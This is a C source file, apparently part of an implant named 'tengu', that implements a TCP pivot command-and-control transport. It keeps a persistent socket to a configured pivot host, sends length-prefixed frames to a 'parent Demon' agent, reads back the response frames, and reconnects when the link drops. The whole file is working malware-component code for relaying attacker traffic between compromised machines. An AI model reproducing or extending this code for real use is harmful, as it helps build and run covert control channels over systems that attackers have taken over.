#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <errno.h>

#include "tengu.h"

/* Persistent connection fd; -1 = not connected. */
static int g_tcp_fd = -1;

static int tcp_connect(void) {
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)g_config.pivot_port);

    if (inet_pton(AF_INET, g_config.pivot_host, &sa.sin_addr) != 1)
        return -1;

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return -1;

    /* 120-second receive timeout so we don't block the agent forever */
    struct timeval tv = { .tv_sec = 120, .tv_usec = 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        close(fd);
        return -1;
    }

    g_tcp_fd = fd;
    return 0;
}

static int tcp_send_all(const uint8_t *buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        ssize_t n = send(g_tcp_fd, buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

static int tcp_recv_all(uint8_t *buf, size_t len) {
    size_t got = 0;
    while (got < len) {
        ssize_t n = recv(g_tcp_fd, buf + got, len - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    return 0;
}

/*
 * TCP pivot C2 transport.
 * Sends a length-prefixed (BE uint32) frame to the parent Demon,
 * then waits for the response frame (also BE uint32 prefixed).
 *
 * The connection is kept persistent across calls; it reconnects
 * automatically if the socket is closed.
 */
int tcp_c2_post(const uint8_t *body, size_t body_len,
                      uint8_t **resp_out, size_t *resp_len_out)
{
    uint32_t be_len;
    uint32_t rlen_be;
    uint32_t rlen;
    uint8_t *rbuf;

    /* Connect (or reconnect) */
    if (g_tcp_fd < 0) {
        if (tcp_connect() < 0)
            return -1;
    }

    /* Send: [BE uint32 length][body] */
    be_len = htonl((uint32_t)body_len);
    if (tcp_send_all((uint8_t*)&be_len, 4) < 0 ||
        tcp_send_all(body, body_len) < 0) {
        close(g_tcp_fd);
        g_tcp_fd = -1;
        return -1;
    }

    /* Receive: [BE uint32 length][response] */
    if (tcp_recv_all((uint8_t*)&rlen_be, 4) < 0) {
        /* Timeout or disconnect - return empty response so main loop continues */
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            *resp_out     = NULL;
            *resp_len_out = 0;
            return 0;
        }
        close(g_tcp_fd);
        g_tcp_fd = -1;
        return -1;
    }

    rlen = ntohl(rlen_be);
    if (rlen == 0) {
        *resp_out     = NULL;
        *resp_len_out = 0;
        return 0;
    }

    rbuf = malloc(rlen);
    if (!rbuf) return -1;

    if (tcp_recv_all(rbuf, rlen) < 0) {
        free(rbuf);
        close(g_tcp_fd);
        g_tcp_fd = -1;
        return -1;
    }

    *resp_out     = rbuf;
    *resp_len_out = rlen;
    return 0;
}
